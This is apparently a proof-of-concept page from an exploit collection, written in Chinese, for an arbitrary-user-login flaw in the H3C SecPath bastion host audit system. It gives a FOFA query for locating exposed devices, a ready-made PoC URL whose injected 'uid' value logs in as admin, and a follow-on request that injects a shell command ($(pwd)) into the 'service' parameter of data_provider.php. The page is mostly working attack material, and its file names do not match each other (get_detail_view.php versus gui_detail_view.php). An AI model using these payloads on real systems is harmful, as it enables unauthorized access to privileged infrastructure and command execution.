## H3C-SecParh堡垒机任意用户登录漏洞

H3C SecParh堡垒机的get_detail_view.php中存在任意用户登录漏洞。攻击者可以构建一个恶意URL，利用该漏洞进行攻击。

## fofa
```
app="H3C-SecPath-运维审计系统" && body="2018"
```

## poc
```
/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin
```

![image](https://github.com/wy876/POC/assets/139549762/8494d9aa-bd2f-4ecb-800f-d27308de54d8)

![image](https://github.com/wy876/POC/assets/139549762/7a66984a-8669-43e1-a527-e3460fc49501)


## 命令执行

通过任意用户登录或者账号密码进入后台才可以构造特殊的请求执行命令

```
https://IP地址:端口/audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40&server_cond=&service=$(pwd)&identity_cond=&query_type=all&format=json&browse=true
```
